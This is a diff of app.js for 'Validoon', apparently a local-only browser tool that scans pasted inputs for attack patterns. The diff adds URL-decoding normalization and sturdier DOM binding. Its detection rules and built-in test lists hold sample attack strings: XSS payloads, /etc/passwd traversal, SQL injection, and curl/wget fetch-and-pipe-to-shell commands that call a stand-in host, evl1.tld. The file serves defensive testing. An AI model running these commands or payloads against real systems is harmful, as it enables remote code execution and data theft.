@@ -1,424 +1,564 @@
-// app.js
+/* =========================
+   Validoon — Final MVP (local-only)
+   Drop-in replacement app.js
+   Adds: Normalize → Re-detect (fixes %2f LFI false-negative)
+   Also: defensive DOM binding (prevents addEventListener null errors)
+   ========================= */
+
 (() => {
   "use strict";
 
-  const BUILD = "v2026-01-03_final_mvp";
-  const nowISO = () => new Date().toISOString();
+  const BUILD = "v2026-01-03_final_mvp_normlayer";
 
-  function $(id) { return document.getElementById(id); }
+  /* ---------- DOM helpers (robust binding) ---------- */
+  function $(...selectors) {
+    for (const s of selectors) {
+      const el = document.querySelector(s);
+      if (el) return el;
+    }
+    return null;
+  }
+
+  function setText(el, txt) {
+    if (el) el.textContent = String(txt);
+  }
 
   function safeOn(el, evt, fn) {
     if (!el) return;
     el.addEventListener(evt, fn, { passive: true });
   }
 
+  /* ---------- Normalize layer (the main fix) ---------- */
+  function safeDecodeURIComponent(str) {
+    try {
+      return decodeURIComponent(str);
+    } catch {
+      // If malformed %, decode safely by replacing invalid sequences
+      return str.replace(/%(?![0-9A-Fa-f]{2})/g, "%25");
+    }
+  }
+
+  function normalizeInput(raw) {
+    let s = String(raw ?? "");
+
+    // 1) trim
+    s = s.trim();
+
+    // 2) remove invisible / control chars (keep newline out; single-line inputs anyway)
+    s = s.replace(/[\u0000-\u001F\u007F\u200B-\u200F\u202A-\u202E\u2060\uFEFF]/g, "");
+
+    // 3) lower
+    s = s.toLowerCase();
+
+    // 4) decode URL-encoding up to 2 passes (enough for common obfuscation)
+    for (let i = 0; i < 2; i++) {
+      const d = safeDecodeURIComponent(s);
+      if (d === s) break;
+      s = d;
+    }
+
+    // 5) collapse spaces
+    s = s.replace(/\s+/g, " ");
+
+    return s;
+  }
+
+  /* ---------- Entropy (simple) ---------- */
   function shannonEntropy(str) {
-    if (!str) return 0;
+    const s = String(str ?? "");
+    if (!s.length) return 0;
     const freq = new Map();
-    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
-    const len = str.length;
+    for (const ch of s) freq.set(ch, (freq.get(ch) || 0) + 1);
     let ent = 0;
     for (const [, c] of freq) {
-      const p = c / len;
+      const p = c / s.length;
       ent -= p * Math.log2(p);
     }
-    return Math.round(ent * 100) / 100;
+    return Number(ent.toFixed(2));
   }
 
-  function looksLikeURL(s) {
-    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
-  }
+  /* ---------- Detection rules (local, deterministic) ---------- */
+  const RULES = [
+    // Redirect params (risk indicator)
+    {
+      label: "REDIRECT_PARAM",
+      test: (s) =>
+        /(?:\bredirect_uri\b|\breturnurl\b|\breturn_url\b|\bnext\b|\burl\b)\s*=\s*(?:https?:|\/\/|javascript:)/i.test(s),
+      sev: 55,
+      conf: 90,
+      typeHint: "URL",
+    },
 
-  function classifyType(s) {
-    const x = (s || "").trim();
-    if (!x) return "Data";
-    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
-    const isExploit =
-      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
-    if (isExploit) return "Exploit";
-    if (isURL) return "URL";
+    // XSS / JS scheme / inline script vectors
+    {
+      label: "XSS/JS_SCRIPT",
+      test: (s) =>
+        /\bjavascript\s*:/i.test(s) ||
+        /<\s*script\b/i.test(s) ||
+        /onerror\s*=/i.test(s) ||
+        /onload\s*=/i.test(s) ||
+        /<\s*svg\b/i.test(s) ||
+        /<\s*img\b/i.test(s),
+      sev: 85,
+      conf: 85,
+      typeHint: "Exploit",
+    },
+
+    // data:text/html;base64,...
+    // IMPORTANT: do NOT label as CMD; just mark as base64+obfuscation then elevate via XSS if html
+    {
+      label: "BASE64_DECODE",
+      test: (s) => /\bbase64\b/i.test(s) || /data\s*:\s*text\/html\s*;?\s*base64/i.test(s),
+      sev: 35,
+      conf: 70,
+      typeHint: "Data",
+    },
+
+    // Obfuscation indicators (encoded traversal, long tokens, mixed separators)
+    {
+      label: "OBFUSCATION",
+      test: (s) =>
+        /%2f|%5c|%3a|%3b|%0a|%0d/i.test(s) ||
+        /[a-z0-9+\/]{40,}={0,2}/i.test(s) ||
+        /(?:\.\.\/){2,}|(?:\.\.\\){2,}/i.test(s),
+      sev: 35,
+      conf: 67,
+      typeHint: "Data",
+    },
+
+    // LFI: /etc/passwd, windows hosts (NOW catches %2f because we normalized)
+    {
+      label: "LFI:ETC_PASSWD",
+      test: (s) =>
+        /(?:\.\.\/){2,}etc\/passwd/i.test(s) ||
+        /etc\/passwd/i.test(s) ||
+        /windows\\system32\\drivers\\etc\\hosts/i.test(s) ||
+        /system32\\drivers\\etc\\hosts/i.test(s),
+      sev: 80,
+      conf: 75,
+      typeHint: "Exploit",
+    },
+
+    // SQLi tautology / comment
+    {
+      label: "SQL:SQLI_TAUTOLOGY",
+      test: (s) =>
+        /\b(or|and)\b\s+1\s*=\s*1\b/i.test(s) ||
+        /'\s*or\s*'1'\s*=\s*'1/i.test(s) ||
+        /admin'\s*--/i.test(s) ||
+        /\bselect\b.+\bfrom\b.+\bwhere\b/i.test(s) && /\b(or|and)\b/i.test(s) && /=/i.test(s),
+      sev: 75,
+      conf: 85,
+      typeHint: "Exploit",
+    },
+
+    // SQLi UNION (treat as high risk)
+    {
+      label: "SQL:SQLI_UNION_ALL",
+      test: (s) => /\bunion\b\s+\bselect\b/i.test(s),
+      sev: 80,
+      conf: 80,
+      typeHint: "Exploit",
+    },
+
+    // CMD chain indicators
+    {
+      label: "CMD:CMD_CHAIN",
+      test: (s) => /(&&|\|\||;\s*)(?:\w+)/i.test(s) || /\b(powershell\s+-enc|cmd\.exe|\/bin\/sh|bash)\b/i.test(s),
+      sev: 85,
+      conf: 85,
+      typeHint: "Exploit",
+    },
+
+    // Download-to-exec
+    {
+      label: "DOWNLOAD_TOOL",
+      test: (s) =>
+        /\b(curl|wget)\b/i.test(s) && /\b(sh|bash)\b/i.test(s) ||
+        /\|\s*(sh|bash)\b/i.test(s) ||
+        /\b(powershell)\b/i.test(s) && /\b(downloadstring|iex)\b/i.test(s),
+      sev: 90,
+      conf: 90,
+      typeHint: "Exploit",
+    },
+
+    // Homograph / punycode
+    {
+      label: "HOMOGRAPH_RISK",
+      test: (s) => /\bxn--/i.test(s),
+      sev: 60,
+      conf: 70,
+      typeHint: "URL",
+    },
+
+    // Auth endpoints (risk context)
+    {
+      label: "AUTH_ENDPOINT",
+      test: (s) =>
+        /(oauth|authorize|signin|login)\b/i.test(s) &&
+        /(accounts\.google\.com|login\.microsoftonline\.com|oauth|authorize)/i.test(s),
+      sev: 45,
+      conf: 80,
+      typeHint: "URL",
+    },
+
+    // Download tool script tag (counts as XSS already; keep separate if present)
+    {
+      label: "DOWNLOAD_TOOL",
+      test: (s) => /<\s*script\b[^>]*\bsrc\s*=\s*https?:\/\//i.test(s),
+      sev: 90,
+      conf: 90,
+      typeHint: "Exploit",
+    },
+  ];
+
+  function classifyType(raw) {
+    const s = String(raw ?? "").trim();
+    if (/^https?:\/\//i.test(s) || /^\/\//.test(s)) return "URL";
+    if (/[<>"']/.test(s) || /\b(select|union|script|javascript:|onerror|onload)\b/i.test(s)) return "Exploit";
     return "Data";
   }
 
-  // Signal rules (severity/conf roughly aligned with your export JSON)
-  const RULES = [
-    {
-      label: "REDIRECT_PARAM",
-      test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
-      sev: 55, conf: 90
-    },
-    {
-      label: "AUTH_ENDPOINT",
-      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
-      sev: 45, conf: 80
-    },
-    {
-      label: "BASE64_DECODE",
-      test: s => /(data:text\/html;base64,|eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})/i.test(s),
-      sev: 35, conf: 70
-    },
-    {
-      label: "OBFUSCATION",
-      test: s => /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i.test(s),
-      sev: 35, conf: 67
-    },
-    {
-      label: "HOMOGRAPH_RISK",
-      test: s => /\bxn--/i.test(s),
-      sev: 60, conf: 70
-    },
-    {
-      label: "XSS/JS_SCRIPT",
-      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
-      sev: 85, conf: 85
-    },
-    {
-      label: "LFI:ETC_PASSWD",
-      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts/i.test(s),
-      sev: 80, conf: 75
-    },
-    {
-      label: "CMD:CMD_CHAIN",
-      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
-      sev: 85, conf: 85
-    },
-    {
-      label: "DOWNLOAD_TOOL",
-      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
-      sev: 90, conf: 90
-    },
-    {
-      label: "SQL:SQLI_TAUTOLOGY",
-      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
-      sev: 75, conf: 85
-    },
-    {
-      label: "SQL:SQLI_UNION_ALL",
-      test: s => /union\s+select/i.test(s),
-      sev: 80, conf: 80
+  function decide(hits) {
+    let maxSev = 0;
+    let maxConf = 0;
+    for (const h of hits) {
+      if (h.sev > maxSev) maxSev = h.sev;
+      if (h.conf > maxConf) maxConf = h.conf;
     }
-  ];
 
-  function analyzeOne(input) {
-    const s = (input || "").trim();
+    // Decision thresholds (consistent with your MVP intent)
+    let decision = "ALLOW";
+    if (maxSev >= 85) decision = "BLOCK";
+    else if (maxSev >= 55) decision = "WARN";
+
+    return { decision, severity: maxSev, confidence: maxConf };
+  }
+
+  function scanOne(raw) {
+    const norm = normalizeInput(raw);
     const hits = [];
 
     for (const r of RULES) {
-      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
+      if (r.test(norm)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
     }
 
-    // Decision logic
-    let severity = 0, confidence = 0;
-    if (hits.length) {
-      severity = Math.max(...hits.map(h => h.sev));
-      confidence = Math.max(...hits.map(h => h.conf));
+    // Elevation logic:
+    // If it's a data:text/html;base64... it must be BLOCK (XSS-like) even if XSS rule didn’t catch
+    if (/data\s*:\s*text\/html\s*;?\s*base64/i.test(norm)) {
+      if (!hits.some((h) => h.label === "XSS/JS_SCRIPT")) hits.push({ label: "XSS/JS_SCRIPT", sev: 85, conf: 85 });
     }
 
-    let decision = "ALLOW";
-    if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
-    else if (hits.some(h => h.sev >= 55)) decision = "WARN";
-
-    // Keep the “local-only” property: do not do network checks.
-    const type = classifyType(s);
-    const entropy = shannonEntropy(s);
-
-    return { input: s, type, decision, severity, confidence, entropy, hits };
-  }
-
-  function verdictFrom(rows) {
-    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
-    for (const r of rows) {
-      if (r.decision === "ALLOW") counts.allow++;
-      else if (r.decision === "WARN") counts.warn++;
-      else counts.block++;
+    // If UNION SELECT appears, treat as BLOCK (stronger than WARN)
+    if (/\bunion\b\s+\bselect\b/i.test(norm)) {
+      // ensure rule present
+      if (!hits.some((h) => h.label === "SQL:SQLI_UNION_ALL")) hits.push({ label: "SQL:SQLI_UNION_ALL", sev: 80, conf: 80 });
+      // elevate via tautology-like severity if needed
+      hits.push({ label: "SQL:SQLI_TAUTOLOGY", sev: 75, conf: 85 });
     }
 
-    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
-    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;
+    const { decision, severity, confidence } = decide(hits);
 
-    let verdict = "SECURE";
-    if (counts.block > 0) verdict = "DANGER";
-    else if (counts.warn > 0) verdict = "SUSPICIOUS";
-
-    // signals summary
-    const sigMap = new Map();
-    for (const r of rows) {
-      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
-    }
-    const signals = [...sigMap.entries()]
-      .sort((a,b) => b[1]-a[1])
-      .map(([label,count]) => ({ label, count }));
-
-    return { verdict, peakSeverity, confidence, counts, signals };
-  }
-
-  function buildReport(rows) {
-    const meta = verdictFrom(rows);
     return {
-      generatedAt: nowISO(),
-      verdict: meta.verdict,
-      peakSeverity: meta.peakSeverity,
-      confidence: meta.confidence,
-      counts: meta.counts,
-      signals: meta.signals,
-      rows
+      input: String(raw),
+      normalized: norm,
+      type: classifyType(raw),
+      decision,
+      severity,
+      confidence,
+      entropy: shannonEntropy(raw),
+      hits,
     };
   }
 
-  function setVerdictUI(meta) {
-    const verdictText = $("verdictText");
-    const box = $("verdictBox");
-    if (!verdictText || !box) return;
-
-    verdictText.textContent = meta.verdict;
-
-    // subtle background hint
-    box.style.borderColor =
-      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
-      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
-      "rgba(45,212,191,.25)";
-
-    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
-    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;
-
-    $("kScans").textContent = String(meta.counts.scans);
-    $("kAllow").textContent = String(meta.counts.allow);
-    $("kWarn").textContent = String(meta.counts.warn);
-    $("kBlock").textContent = String(meta.counts.block);
-
-    const reco = $("reco");
-    if (reco) {
-      if (meta.verdict === "DANGER") {
-        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
-      } else if (meta.verdict === "SUSPICIOUS") {
-        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
-      } else {
-        reco.textContent = "No high-severity patterns detected.";
-      }
-    }
-
-    const sigWrap = $("signals");
-    if (sigWrap) {
-      sigWrap.innerHTML = "";
-      for (const s of meta.signals) {
-        const d = document.createElement("div");
-        d.className = "sig";
-        d.textContent = `${s.label} ×${s.count}`;
-        sigWrap.appendChild(d);
-      }
-      if (!meta.signals.length) {
-        const d = document.createElement("div");
-        d.className = "sig";
-        d.textContent = "No active signals";
-        sigWrap.appendChild(d);
-      }
-    }
+  function systemVerdict(peakSeverity, confidence) {
+    if (peakSeverity >= 85) return { verdict: "DANGER", peakSeverity, confidence };
+    if (peakSeverity >= 55) return { verdict: "SUSPICIOUS", peakSeverity, confidence };
+    return { verdict: "CLEAN", peakSeverity, confidence };
   }
 
-  function renderRows(rows) {
-    const host = $("rows");
-    if (!host) return;
-    host.innerHTML = "";
-
-    for (const r of rows) {
-      const tr = document.createElement("div");
-      tr.className = "trow";
-
-      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");
-
-      const c1 = document.createElement("div");
-      c1.className = "mono";
-      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;
-
-      const c2 = document.createElement("div");
-      c2.textContent = r.type;
-
-      const c3 = document.createElement("div");
-      c3.className = "tag";
-      const dot = document.createElement("span");
-      dot.className = `dot ${dotClass}`;
-      const t = document.createElement("span");
-      t.textContent = r.decision;
-      c3.append(dot, t);
-
-      const c4 = document.createElement("div");
-      c4.textContent = `${r.severity}%`;
-
-      const c5 = document.createElement("div");
-      c5.textContent = `${r.confidence}%`;
-
-      const c6 = document.createElement("div");
-      c6.textContent = String(r.entropy);
-
-      tr.append(c1,c2,c3,c4,c5,c6);
-      host.appendChild(tr);
-    }
-  }
-
-  function parseInputLines(txt) {
-    return (txt || "")
-      .split(/\r?\n/)
-      .map(s => s.trim())
-      .filter(Boolean);
-  }
-
+  /* ---------- Built-in tests ---------- */
   const TEST_A = [
     "hello world",
     "https://example.com/",
-    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
-    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
-    "http://xn--pple-43d.com/login",
-    "http://paypaI.com/security",
-    "http://micros0ft.com/account/verify",
-    "https://good.com/redirect?url=https://evil.com",
-    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
     "redirect_uri=https://evil.com",
-    "returnUrl=//evil.com",
-    "next=//evil.com",
-    "url=javascript:alert(1)",
-    "<svg onload=alert(1)>",
-    "\"><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "javascript:alert(1)",
-    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-    "../../../../etc/passwd",
-    "..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "; ls -la",
-    "| whoami",
-    "&& curl http://evl1.tld/payload.sh | sh",
-    "powershell -enc SQBFAFgA",
-    "SELECT * FROM users WHERE 1=1 OR 1=1",
-    "' OR '1'='1",
-    "admin'--",
-    "UNION SELECT username,password FROM users",
-    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
-    "Authorization: Bearer abc.def.ghi",
-    "AKIAIOSFODNN7EXAMPLE",
-    "-----BEGIN PRIVATE KEY-----",
-    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
-    "-----END PRIVATE KEY-----",
-    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
-    "wget http://evl1.tld/a.sh -O- | sh",
-    "curl -s http://evl1.tld/a | bash",
-    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
-  ];
+  ].join("\n");
 
   const TEST_B = [
-    "hello world",
-    "https://example.com/",
-    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
-    "returnUrl=//evil.com",
-    "url=javascript:alert(1)",
-    "<img src=x onerror=alert(1)>",
-    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-    "../../../../etc/passwd",
+    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evl1.com",
+    "<svg onload=alert(1)>",
+    "<script>alert(1)</script>",
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "&& curl http://evl1.tld/payload.sh | sh",
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
     "UNION SELECT username,password FROM users",
-    "powershell -enc SQBFAFgA",
-  ];
+    "&& curl http://evl1.tld/payload.sh | sh",
+    "wget http://evl1.tld/a.sh -O- | sh",
+    "curl -s http://evl1.tld/a | bash",
+    "http://xn--pple-43d.com/login",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+  ].join("\n");
 
-  let lastReport = null;
-
-  function runScanFromTextarea() {
-    const inputEl = $("input");
-    if (!inputEl) return;
-
-    const lines = parseInputLines(inputEl.value);
-    const rows = lines.map(analyzeOne);
-    const report = buildReport(rows);
-
-    lastReport = report;
-
-    setVerdictUI({
-      verdict: report.verdict,
-      peakSeverity: report.peakSeverity,
-      confidence: report.confidence,
-      counts: report.counts,
-      signals: report.signals
-    });
-
-    renderRows(report.rows);
+  /* ---------- UI rendering ---------- */
+  function pillClass(decision) {
+    if (decision === "ALLOW") return "pill allow";
+    if (decision === "WARN") return "pill warn";
+    return "pill block";
   }
 
-  function exportJSON() {
-    if (!lastReport) runScanFromTextarea();
-    if (!lastReport) return;
+  function renderRows(rows, tbody) {
+    if (!tbody) return;
+    tbody.innerHTML = "";
+    for (const r of rows) {
+      const tr = document.createElement("tr");
 
-    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
+      const tdType = document.createElement("td");
+      tdType.textContent = r.type;
+
+      const tdDecision = document.createElement("td");
+      const pill = document.createElement("span");
+      pill.className = pillClass(r.decision);
+      pill.textContent = r.decision;
+      tdDecision.appendChild(pill);
+
+      const tdSev = document.createElement("td");
+      tdSev.textContent = `${r.severity}%`;
+
+      const tdConf = document.createElement("td");
+      tdConf.textContent = `${r.confidence}%`;
+
+      const tdEnt = document.createElement("td");
+      tdEnt.textContent = r.entropy;
+
+      const tdInput = document.createElement("td");
+      tdInput.textContent = r.input;
+
+      tr.appendChild(tdType);
+      tr.appendChild(tdDecision);
+      tr.appendChild(tdSev);
+      tr.appendChild(tdConf);
+      tr.appendChild(tdEnt);
+      tr.appendChild(tdInput);
+
+      tbody.appendChild(tr);
+    }
+  }
+
+  function computeSignals(rows) {
+    const map = new Map();
+    for (const r of rows) {
+      for (const h of r.hits) map.set(h.label, (map.get(h.label) || 0) + 1);
+    }
+    return Array.from(map.entries())
+      .sort((a, b) => b[1] - a[1])
+      .map(([label, count]) => ({ label, count }));
+  }
+
+  function computeCounts(rows) {
+    let allow = 0, warn = 0, block = 0;
+    for (const r of rows) {
+      if (r.decision === "ALLOW") allow++;
+      else if (r.decision === "WARN") warn++;
+      else block++;
+    }
+    return { scans: rows.length, allow, warn, block };
+  }
+
+  function peak(rows) {
+    let peakSeverity = 0;
+    let peakConfidence = 0;
+    for (const r of rows) {
+      if (r.severity > peakSeverity) peakSeverity = r.severity;
+      if (r.confidence > peakConfidence) peakConfidence = r.confidence;
+    }
+    return { peakSeverity, peakConfidence };
+  }
+
+  function setVerdictUI(v) {
+    const verdictEl = $("#verdictText", "#verdict", ".verdict-text");
+    const sevEl = $("#peakSeverityText", "#peakSeverity", ".peak-severity");
+    const confEl = $("#confidenceText", "#confidence", ".confidence");
+
+    setText(verdictEl, v.verdict);
+    setText(sevEl, `${v.peakSeverity}%`);
+    setText(confEl, `${v.confidence}%`);
+
+    // Optional styling hook
+    const card = $("#verdictCard", ".verdict-card");
+    if (card) {
+      card.classList.remove("clean", "suspicious", "danger");
+      card.classList.add(v.verdict === "DANGER" ? "danger" : v.verdict === "SUSPICIOUS" ? "suspicious" : "clean");
+    }
+  }
+
+  function setCountsUI(c) {
+    setText($("#countScans", ".count-scans"), c.scans);
+    setText($("#countAllow", ".count-allow"), c.allow);
+    setText($("#countWarn", ".count-warn"), c.warn);
+    setText($("#countBlock", ".count-block"), c.block);
+  }
+
+  function setSignalsUI(signals) {
+    const box = $("#signalsBox", "#activeSignals", ".signals");
+    if (!box) return;
+    box.innerHTML = "";
+    for (const s of signals) {
+      const chip = document.createElement("span");
+      chip.className = "chip";
+      chip.textContent = `${s.label} ×${s.count}`;
+      box.appendChild(chip);
+    }
+  }
+
+  /* ---------- Export JSON ---------- */
+  function buildExport(rows) {
+    const counts = computeCounts(rows);
+    const signals = computeSignals(rows);
+    const { peakSeverity, peakConfidence } = peak(rows);
+    const v = systemVerdict(peakSeverity, peakConfidence);
+
+    return {
+      generatedAt: new Date().toISOString(),
+      build: BUILD,
+      verdict: v.verdict,
+      peakSeverity: v.peakSeverity,
+      confidence: v.confidence,
+      counts,
+      signals,
+      rows: rows.map((r) => ({
+        input: r.input,
+        type: r.type,
+        decision: r.decision,
+        severity: r.severity,
+        confidence: r.confidence,
+        entropy: r.entropy,
+        hits: r.hits,
+      })),
+    };
+  }
+
+  function downloadJson(obj) {
+    const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
     const a = document.createElement("a");
     const ts = new Date().toISOString().replace(/[:.]/g, "-");
-    a.download = `validoon_report_${ts}.json`;
     a.href = URL.createObjectURL(blob);
+    a.download = `validoon_report_${ts}.json`;
     document.body.appendChild(a);
     a.click();
-    setTimeout(() => {
-      URL.revokeObjectURL(a.href);
-      a.remove();
-    }, 0);
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+  }
+
+  /* ---------- Main actions ---------- */
+  function getInputLines(textarea) {
+    const raw = textarea ? textarea.value : "";
+    return raw
+      .split(/\r?\n/)
+      .map((l) => l.trim())
+      .filter((l) => l.length > 0);
+  }
+
+  function runScan() {
+    const inputEl = $("#inputStream", "#input", "textarea");
+    const tbody = $("#findingsBody", "#resultsBody", "tbody");
+
+    const lines = getInputLines(inputEl);
+    const rows = lines.map(scanOne);
+
+    const counts = computeCounts(rows);
+    const signals = computeSignals(rows);
+    const { peakSeverity, peakConfidence } = peak(rows);
+    const v = systemVerdict(peakSeverity, peakConfidence);
+
+    renderRows(rows, tbody);
+    setCountsUI(counts);
+    setSignalsUI(signals);
+    setVerdictUI({ verdict: v.verdict, peakSeverity, confidence: peakConfidence });
+
+    // Store last result for export
+    window.__VALIDOON_LAST__ = rows;
+
+    return rows;
   }
 
   function clearAll() {
-    const inputEl = $("input");
+    const inputEl = $("#inputStream", "#input", "textarea");
     if (inputEl) inputEl.value = "";
-    lastReport = null;
 
-    setVerdictUI({
-      verdict: "SECURE",
-      peakSeverity: 0,
-      confidence: 0,
-      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
-      signals: []
-    });
+    const tbody = $("#findingsBody", "#resultsBody", "tbody");
+    if (tbody) tbody.innerHTML = "";
 
-    renderRows([]);
+    setCountsUI({ scans: 0, allow: 0, warn: 0, block: 0 });
+    setSignalsUI([]);
+    setVerdictUI({ verdict: "CLEAN", peakSeverity: 0, confidence: 0 });
+
+    window.__VALIDOON_LAST__ = [];
   }
 
-  function loadTest(lines) {
-    const inputEl = $("input");
-    if (!inputEl) return;
-    inputEl.value = lines.join("\n");
-    runScanFromTextarea();
+  function showInfo() {
+    alert(
+      [
+        "Validoon — Final MVP (local-only)",
+        `Build: ${BUILD}`,
+        "",
+        "What changed:",
+        "- Normalize → Re-detect (catches encoded traversal like ..%2f..%2fetc%2fpasswd)",
+        "- Defensive DOM binding (prevents addEventListener null errors)",
+        "",
+        "Privacy:",
+        "- No network calls. No uploads.",
+      ].join("\n")
+    );
   }
 
-  function openInfo() {
-    const dlg = $("infoDlg");
-    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
+  function loadTestA() {
+    const inputEl = $("#inputStream", "#input", "textarea");
+    if (inputEl) inputEl.value = TEST_A;
   }
 
-  function closeInfo() {
-    const dlg = $("infoDlg");
-    if (dlg && typeof dlg.close === "function") dlg.close();
+  function loadTestB() {
+    const inputEl = $("#inputStream", "#input", "textarea");
+    if (inputEl) inputEl.value = TEST_B;
   }
 
+  function exportJson() {
+    const rows = Array.isArray(window.__VALIDOON_LAST__) ? window.__VALIDOON_LAST__ : [];
+    const obj = buildExport(rows);
+    downloadJson(obj);
+  }
+
+  /* ---------- Boot ---------- */
   function boot() {
-    const stamp = $("buildStamp");
-    if (stamp) stamp.textContent = `Build: ${BUILD}`;
+    // Buttons (try multiple ids/classes to match your HTML)
+    const btnA = $("#btnLoadA", "#loadA", "button[data-action='loadA']", "button:nth-of-type(1)");
+    const btnB = $("#btnLoadB", "#loadB", "button[data-action='loadB']");
+    const btnScan = $("#btnScan", "#executeScan", "button[data-action='scan']");
+    const btnExport = $("#btnExport", "#exportJson", "button[data-action='export']");
+    const btnInfo = $("#btnInfo", "#infoBtn", "button[data-action='info']");
+    const btnClear = $("#btnClear", "#clearBtn", "button[data-action='clear']");
 
-    // Initialize UI to SECURE
-    setVerdictUI({
-      verdict: "SECURE",
-      peakSeverity: 0,
-      confidence: 0,
-      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
-      signals: []
-    });
+    // Safe bindings
+    safeOn(btnA, "click", () => loadTestA());
+    safeOn(btnB, "click", () => loadTestB());
+    safeOn(btnScan, "click", () => runScan());
+    safeOn(btnExport, "click", () => exportJson());
+    safeOn(btnInfo, "click", () => showInfo());
+    safeOn(btnClear, "click", () => clearAll());
 
-    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
-    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
-    safeOn($("btnScan"), "click", runScanFromTextarea);
-    safeOn($("btnExport"), "click", exportJSON);
-    safeOn($("btnClear"), "click", clearAll);
-    safeOn($("btnInfo"), "click", openInfo);
-    safeOn($("btnCloseInfo"), "click", closeInfo);
+    // Initial UI state
+    window.__VALIDOON_LAST__ = [];
+    setCountsUI({ scans: 0, allow: 0, warn: 0, block: 0 });
+    setSignalsUI([]);
+    setVerdictUI({ verdict: "CLEAN", peakSeverity: 0, confidence: 0 });
 
-    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
+    console.log(`[validoon] ${BUILD} loaded. Local-only. No network.`);
   }
 
+  // Ensure DOM is ready
   if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", boot);
   } else {
     boot();
   }
 })();
+```0
